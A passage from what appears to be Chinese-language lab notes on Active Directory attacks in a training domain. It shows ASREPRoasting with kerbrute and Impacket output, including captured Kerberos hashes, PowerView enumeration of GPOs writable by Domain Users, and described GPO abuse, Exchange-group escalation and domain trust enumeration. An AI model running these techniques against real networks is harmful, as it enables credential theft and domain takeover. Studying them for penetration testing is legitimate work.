jjones@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: tjohnson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: jwilson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: bdavis@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: njohnson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: asanchez@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: dlewis@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: ccruz@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] mmorgan has no pre auth required. Dumping hash to crack offline:</span><br><span class="line">$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>有了有效用户列表，可以使用Impacket 工具包中的<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">Get-NPUsers.py</a>来搜索所有不需要 Kerberos 预认证的用户。该工具将检索 Hashcat 格式的 AS-REP，以便对找到的任何用户进行离线破解。还可以向<code>jsmith.txt</code>工具中输入一个单词列表，它会为不存在的用户抛出错误，但如果它发现任何没有 Kerberos 预认证的有效用户，那么这可能是获得立足点或进一步访问的好方法，具体取决于在评估过程中所处的位置。即使无法使用 Hashcat 破解 AS-REP，仍然应该将此作为发现报告给客户（如果无法破解密码，风险会降低），以便他们可以评估帐户是否需要此设置。</p><h4 id="Impacket-GetNPUsers-py"><a href="#Impacket-GetNPUsers-py" class="headerlink" title="Impacket GetNPUsers.py"></a>Impacket GetNPUsers.py</h4><p>搜寻无需使用 Kerberoast 预授权的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users </span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User sbrown@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User jjones@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User tjohnson@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User jwilson@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User bdavis@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User njohnson@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User asanchez@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User dlewis@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User ccruz@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9</span><br><span class="line">[-] User rramirez@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User jwallace@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User jsantiago@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>已经介绍了几种从 Windows 和 Linux 主机执行 ASREPRoasting 攻击的方法，并见证了如何不需要在加入域的主机上来 a) 枚举不需要 Kerberos 预身份验证的帐户，以及 b) 执行此攻击并获取 AS-REP 进行离线破解，以在域中获得立足点或进一步获取访问权限。</p><h2 id="Group-Policy-Object-GPO-Abuse"><a href="#Group-Policy-Object-GPO-Abuse" class="headerlink" title="Group Policy Object (GPO) Abuse"></a>Group Policy Object (GPO) Abuse</h2><p>组策略为管理员提供了许多高级设置，这些设置可应用于 AD 环境中的用户和计算机对象。如果使用得当，组策略是一种通过配置用户设置、操作系统和应用程序来强化 AD 环境的绝佳工具。话虽如此，组策略也可能被攻击者滥用。如果可以通过 ACL 错误配置获得对组策略对象的权限，可以利用这一点进行横向移动、特权升级，甚至域入侵，并将其作为域内的持久性机制。了解如何枚举和攻击 GPO 可以为提供帮助，有时甚至可以成为在相当封闭的环境中实现目标的关键。</p><p>GPO 错误配置可能被滥用来执行以下攻击：</p><ul><li>为用户添加额外权限（例如 SeDebugPrivilege、SeTakeOwnershipPrivilege 或 SeImpersonatePrivilege）</li><li>将本地管理员用户添加到一个或多个主机</li><li>创建立即计划任务来执行任意数量的操作</li></ul><p>可以使用本模块中使用的许多工具（例如 PowerView 和 BloodHound）枚举 GPO 信息。还可以使用<a href="https://github.com/Group3r/Group3r">group3r</a>、<a href="https://github.com/sense-of-security/ADRecon">ADRecon</a>、<a href="https://www.pingcastle.com/">PingCastle</a>等来审核域中 GPO 的安全性。</p><p>使用PowerView 中的<a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO">Get-DomainGPO</a>功能，可以按名称获取 GPO 列表。</p><h3 id="Enumerating-GPO-Names-PowerView"><a href="#Enumerating-GPO-Names-PowerView" class="headerlink" title="Enumerating GPO Names - PowerView"></a>Enumerating GPO Names - PowerView</h3><p>PowerView 枚举 GPO 名称</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGPO</span> |<span class="built_in">select</span> displayname</span><br><span class="line"></span><br><span class="line">displayname</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">Default Domain Policy</span><br><span class="line">Default Domain Controllers Policy</span><br><span class="line">Deny Control Panel Access</span><br><span class="line">Disallow LM Hash</span><br><span class="line">Deny CMD Access</span><br><span class="line">Disable Forced Restarts</span><br><span class="line">Block Removable Media</span><br><span class="line">Disable Guest Account</span><br><span class="line">Service Accounts Password Policy</span><br><span class="line">Logon Banner</span><br><span class="line">Disconnect Idle RDP</span><br><span class="line">Disable NetBIOS</span><br><span class="line">AutoLogon</span><br><span class="line">GuardAutoLogon</span><br><span class="line">Certificate Services</span><br></pre></td></tr></table></figure><p>这可以帮助开始了解已实施的安全措施类型（例如拒绝 cmd.exe 访问和为服务帐户设置单独的密码策略）。可以看到正在使用自动登录，这可能意味着 GPO 中有一个可读的密码，并且可以看到域中存在 Active Directory 证书服务 (AD CS)。如果使用的主机上安装了组策略管理工具，可以使用各种内置的<a href="https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps">GroupPolicy cmdlet</a>来<code>Get-GPO</code>执行相同的枚举。</p><h3 id="Enumerating-GPO-Names-Built-In-Cmdlet"><a href="#Enumerating-GPO-Names-Built-In-Cmdlet" class="headerlink" title="Enumerating GPO Names - Built-In Cmdlet"></a>Enumerating GPO Names - Built-In Cmdlet</h3><p>使用内置 Cmdlet 枚举 GPO 名称</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-GPO</span> <span class="literal">-All</span> | <span class="built_in">Select</span> DisplayName</span><br><span class="line"></span><br><span class="line">DisplayName</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">Certificate Services</span><br><span class="line">Default Domain Policy</span><br><span class="line">Disable NetBIOS</span><br><span class="line">Disable Guest Account</span><br><span class="line">AutoLogon</span><br><span class="line">Default Domain Controllers Policy</span><br><span class="line">Disconnect Idle RDP</span><br><span class="line">Disallow LM Hash</span><br><span class="line">Deny CMD Access</span><br><span class="line">Block Removable Media</span><br><span class="line">GuardAutoLogon</span><br><span class="line">Service Accounts Password Policy</span><br><span class="line">Logon Banner</span><br><span class="line">Disable Forced Restarts</span><br><span class="line">Deny Control Panel Access</span><br></pre></td></tr></table></figure><p>接下来，可以检查可以控制的用户是否对 GPO 拥有任何权限。特定用户或组可能被授予管理一个或多个 GPO 的权限。首先要检查的是整个域用户组是否对一个或多个 GPO 拥有任何权限。</p><h3 id="Enumerating-Domain-User-GPO-Rights"><a href="#Enumerating-Domain-User-GPO-Rights" class="headerlink" title="Enumerating Domain User GPO Rights"></a>Enumerating Domain User GPO Rights</h3><p>枚举域用户 GPO 权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$sid</span>=<span class="built_in">Convert-NameToSid</span> <span class="string">&quot;Domain Users&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGPO</span> | <span class="built_in">Get-ObjectAcl</span> | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125;</span><br><span class="line"></span><br><span class="line">ObjectDN              : CN=&#123;<span class="number">7</span>CA9C789<span class="literal">-14CE-46E3-A722-83F4097AF532</span>&#125;,CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ObjectSID             :</span><br><span class="line">ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,</span><br><span class="line">                        WriteOwner</span><br><span class="line">BinaryLength          : <span class="number">36</span></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">IsCallback            : False</span><br><span class="line">OpaqueLength          : <span class="number">0</span></span><br><span class="line">AccessMask            : <span class="number">983095</span></span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-513</span></span><br><span class="line">AceType               : AccessAllowed</span><br><span class="line">AceFlags              : ObjectInherit, ContainerInherit</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : ContainerInherit, ObjectInherit</span><br><span class="line">PropagationFlags      : None</span><br><span class="line">AuditFlags            : None</span><br></pre></td></tr></table></figure><p>在这里可以看到，域用户组对 GPO 具有各种权限，例如<code>WriteProperty</code>和<code>WriteDacl</code>，可以利用这些权限完全控制 GPO，并发起任意数量的攻击，这些攻击将被推送到应用 GPO 的 OU 中的任何用户和计算机。可以使用 GPO GUID 结合<code>Get-GPO</code>来查看 GPO 的显示名称。</p><h3 id="Converting-GPO-GUID-to-Name"><a href="#Converting-GPO-GUID-to-Name" class="headerlink" title="Converting GPO GUID to Name"></a>Converting GPO GUID to Name</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ <span class="built_in">Get-GPO</span> <span class="literal">-Guid</span> <span class="number">7</span>CA9C789<span class="literal">-14CE-46E3-A722-83F4097AF532</span></span><br><span class="line"></span><br><span class="line">DisplayName      : Disconnect Idle RDP</span><br><span class="line">DomainName       : INLANEFREIGHT.LOCAL</span><br><span class="line">Owner            : INLANEFREIGHT\Domain Admins</span><br><span class="line">Id               : <span class="number">7</span>ca9c789<span class="literal">-14ce-46e3-a722-83f4097af532</span></span><br><span class="line">GpoStatus        : AllSettingsEnabled</span><br><span class="line">Description      :</span><br><span class="line">CreationTime     : <span class="number">10</span>/<span class="number">28</span>/<span class="number">2021</span> <span class="number">3</span>:<span class="number">34</span>:<span class="number">07</span> PM</span><br><span class="line">ModificationTime : <span class="number">4</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">54</span>:<span class="number">25</span> PM</span><br><span class="line">UserVersion      : AD Version: <span class="number">0</span>, SysVol Version: <span class="number">0</span></span><br><span class="line">ComputerVersion  : AD Version: <span class="number">0</span>, SysVol Version: <span class="number">0</span></span><br><span class="line">WmiFilter        :</span><br></pre></td></tr></table></figure><p>检查 BloodHound，可以看到该<code>Domain Users</code>组织对<code>Disconnect Idle RDP</code> GPO 拥有多项权限，可以利用这些权限完全控制该对象。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729062756662.png" alt="图像"></p><p>如果在 BloodHound 中选择 GPO 并向下滚动到<code>Affected Objects</code>选项<code>Node Info</code>卡，可以看到该 GPO 应用于一个 OU，其中包含四个计算机对象。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729062757039.png" alt="图像"></p><p><a href="https://github.com/FSecureLABS/SharpGPOAbuse">可以使用SharpGPOAbuse</a>之类的工具来利用此 GPO 错误配置，方法是执行一些操作，例如将控制的用户添加到受影响主机之一的本地管理员组、在其中一台主机上创建即时计划任务以向提供反向 shell，或者配置恶意计算机启动脚本以向提供反向 shell 或类似操作。使用此类工具时，需要小心，因为可以运行影响 GPO 链接到的 OU 内每台计算机的命令。如果发现一个可编辑的 GPO 适用于具有 1,000 台计算机的 OU，不想犯将自己添加为这么多主机的本地管理员的错误。此工具提供的一些攻击选项允许指定目标用户或主机。上图所示的主机不可利用，GPO 攻击将在后面的模块中深入介绍。</p><p>在 AD 环境中默认安装 Microsoft Exchange（没有拆分管理模型）会打开许多攻击途径，因为 Exchange 通常会在域内被授予相当大的权限（通过用户、组和 ACL）。该组<code>Exchange Windows Permissions</code>未列为受保护组，但成员被授予将 DACL 写入域对象的权限。可以利用这一点为用户提供 DCSync 权限。攻击者可以利用 DACL 配置错误（可能）或利用属于 Account Operators 组的受感染帐户将帐户添加到此组。通常会发现用户帐户甚至计算机是此组的成员。远程办公室的高级用户和支持人员e通常会被添加到此组，从而允许他们重置密码。此<a href="https://github.com/gdedrouas/Exchange-AD-Privesc">GitHub 存储库</a>详细介绍了利用 Exchange 在 AD 环境中提升权限的几种技术。</p><p>Exchange 组<code>Organization Management</code>是另一个非常强大的组（实际上是 Exchange 的“域管理员”），可以访问所有域用户的邮箱。系统管理员成为此组的成员并不罕见。此组还对名为<code>Microsoft Exchange Security Groups</code>的 OU 具有完全控制权，其中包含组<code>Exchange Windows Permissions</code>。</p><hr><h1 id="Domain-Trusts"><a href="#Domain-Trusts" class="headerlink" title="Domain Trusts"></a>Domain Trusts</h1><p>信任用于建立林间或域间（域内）身份验证，允许用户访问其帐户所在主域之外的另一个域中的资源（或执行管理任务）。<a href="https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx">信任</a>在两个域的身份验证系统之间建立链接，并可能允许单向或双向（双向）通信。组织可以创建各种类型的信任：</p><ul><li><code>Parent-child</code>：同一林内的两个或多个域。子域与父域具有双向传递信任，这意味着子域<code>corp.inlanefreight.local</code>中的用户可以在父域<code>inlanefreight.local</code>中进行身份验证，反之亦然。</li><li><code>Cross-link</code>：子域之间的信任，以加快身份验证速度。</li><li><code>External</code>：两个独立域之间的非传递信任，这两个域位于不同的林中，且尚未加入林信任。这种信任类型利用<a href="https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html">SID 筛选</a>或筛选出非受信任域的身份验证请求（按 SID）。</li><li><code>Tree-root</code>：林根域和新树根域之间的双向可传递信任。它们是在您在林中设置新树根域时设计创建的。</li><li><code>Forest</code>：两个林根域之间的可传递信任。</li><li><a href="https://docs.microsoft.com/en-us/security/compass/esae-retirement">ESAE</a>：用于管理Active Directory的堡垒林。</li></ul><p>信任可以是可传递的，也可以是非传递的。</p><ul><li>信任<code>transitive</code>意味着信任扩展到子域信任的对象。例如，假设有三个域。在传递关系中，如果<code>Domain A</code>与 有信任<code>Domain B</code>，并且与<code>Domain B</code>有<code>transitive</code>信任<code>Domain C</code>，那么<code>Domain A</code>将自动信任<code>Domain C</code>。</li><li>在 中<code>non-transitive trust</code>，子域本身是唯一受信任的域。</li></ul><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729248530489.png" alt="图像"></p><p><strong>Trust Table</strong></p><table><thead><tr><th>Transitive</th><th>Non-Transitive</th></tr></thead><tbody><tr><td>共享，一对多</td><td>直接信任</td></tr><tr><td>森林里的每个人都有这份信任</td><td>不扩展到下一级子域</td></tr><tr><td>森林、树根、父子和交叉链接信任都是可传递的</td><td>适用于外部或自定义信任设置</td></tr></tbody></table><p>信任可以从两个方向建立：单向或双向。</p><ul><li><code>One-way trust</code>：域中的<code>trusted</code>用户可以访问信任域中的资源，反之则不行。</li><li><code>Bidirectional trust</code>：两个信任域中的用户都可以访问对方域中的资源。例如，在<code>INLANEFREIGHT.LOCAL</code>和<code>FREIGHTLOGISTICS.LOCAL</code>之间的双向信任中，<code>INLANEFREIGHT.LOCAL</code>中的用户将能够访问<code>FREIGHTLOGISTICS.LOCAL</code>中的资源，反之亦然。</li></ul><p>域信任通常设置不正确，可能会为提供关键的意外攻击路径。以下是各种信任类型的图形表示。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729248719965.png" alt="图像"></p><h2 id="Enum-Trust-Relationships"><a href="#Enum-Trust-Relationships" class="headerlink" title="Enum Trust Relationships"></a>Enum Trust Relationships</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="Get-ADTrust-1"><a href="#Get-ADTrust-1" class="headerlink" title="Get-ADTrust"></a>Get-ADTrust</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> activedirectory</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : f48a1169<span class="literal">-2e58-42c1-ba32-a6ccb10057ec</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : <span class="number">1597717</span>f<span class="literal">-89b7-49b8-9cd9-0801d52475ca</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">8</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure><p>上面的输出显示当前的域<code>INLANEFREIGHT.LOCAL</code>有两个域信任。第一个信任是与<code>LOGISTICS.INLANEFREIGHT.LOCAL</code>，属性<code>IntraForest</code>显示这是一个子域，当前位于林的根域中。第二个信任是与 域的信任<code>FREIGHTLOGISTICS.LOCAL,</code>，<code>ForestTransitive</code>属性设置为<code>True</code>，这意味着这是一个林信任或外部信任。可以看到这两个信任都设置为双向的，这意味着用户可以在两个信任之间来回进行身份验证。在评估期间记下这一点很重要。如果无法跨信任进行身份验证，就无法跨信任执行任何枚举或攻击。</p><h4 id="Get-DomainUser-1"><a href="#Get-DomainUser-1" class="headerlink" title="Get-DomainUser"></a>Get-DomainUser</h4><p>枚举 Active Directory 域中的用户信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Domain</span> LOGISTICS.INLANEFREIGHT.LOCAL | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">htb<span class="literal">-student_adm</span></span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">lab_adm</span><br><span class="line">krbtgt</span><br></pre></td></tr></table></figure><h3 id="PowerView-4"><a href="#PowerView-4" class="headerlink" title="PowerView"></a>PowerView</h3><h4 id="Get-DomainTrust"><a href="#Get-DomainTrust" class="headerlink" title="Get-DomainTrust"></a>Get-DomainTrust</h4><p>还可以使用 PowerView 和 BloodHound 来枚举信任关系、建立的信任类型和身份验证流程。导入 PowerView 后，可以使用<a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrust/">Get-DomainTrust</a>函数来枚举存在的信任（如果有）。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainTrust</span></span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br></pre></td></tr></table></figure><p>PowerView 可用于执行域信任映射并提供诸如信任类型（父&#x2F;子、外部、林）和信任方向（单向或双向）等信息。一旦获得立足点，这些信息就会很有用，计划进一步破坏环境。</p><h4 id="Get-DomainTrustMapping-1"><a href="#Get-DomainTrustMapping-1" class="headerlink" title="Get-DomainTrustMapping"></a>Get-DomainTrustMapping</h4><p>枚举 Active Directory 环境中域与域之间的信任关系</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 